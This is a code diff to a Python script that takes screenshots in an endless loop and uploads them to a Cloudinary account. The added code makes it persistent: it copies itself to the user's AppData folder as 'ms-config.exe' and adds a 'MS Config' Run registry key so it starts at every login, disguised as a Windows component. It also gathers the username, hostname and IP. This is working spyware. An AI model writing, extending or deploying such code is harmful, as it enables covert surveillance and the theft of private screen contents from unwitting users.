@@ -1,15 +1,22 @@
 import pyautogui
 
-from PIL import Image
-
 from cloudinary import config
 from cloudinary.uploader import upload
 from datetime import datetime
-from os import path, getlogin, makedirs, remove
+from os import path, getlogin, makedirs, remove, getenv
 from platform import node, system
 from socket import gethostbyname, gethostname
+from shutil import copyfile
+from sys import executable
 from time import sleep
-
+from winreg import (
+    CloseKey,
+    OpenKey,
+    SetValueEx,
+    HKEY_CURRENT_USER,
+    KEY_SET_VALUE,
+    REG_SZ,
+)
 
 config(
     cloud_name="dsnwguzkd",
@@ -31,6 +38,31 @@ SAVE_PATH = f"C:/Users/{USER_NAME}/AppData/local/Temp"
 makedirs(SAVE_PATH, exist_ok=True)
 
 
+def copy_to_roaming():
+    roaming_path = getenv("APPDATA")
+    new_path = path.join(roaming_path, "ms-config.exe")
+
+    if not path.exists(new_path):
+        try:
+            copyfile(executable, new_path)
+        except Exception as e:
+            print(f"Error copiando a roaming: {e}")
+    return new_path
+
+
+def add_to_registry(exe_path):
+    reg_key = HKEY_CURRENT_USER
+    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    name = "MS Config"
+
+    try:
+        key = OpenKey(reg_key, reg_path, 0, KEY_SET_VALUE)
+        SetValueEx(key, name, 0, REG_SZ, exe_path)
+        CloseKey(key)
+    except Exception as e:
+        print(f"Error agregando a registro: {e}")
+
+
 def upload_to_cloudinary(filepath: str) -> None:
     file_name = filepath[len(SAVE_PATH) + 1 : -4]
     time_stamp = datetime.now().isoformat()
@@ -50,7 +82,7 @@ def upload_to_cloudinary(filepath: str) -> None:
     remove(filepath)
 
 
-def take_screenshot():
+def take_screenshot() -> None:
     while True:
         filename = datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".jpg"
         filepath = path.join(SAVE_PATH, filename)
@@ -65,4 +97,7 @@ def take_screenshot():
         sleep(INTERVAL)
 
 
-take_screenshot()
+if __name__ == "__main__":
+    exe_path = copy_to_roaming()
+    add_to_registry(exe_path)
+    take_screenshot()
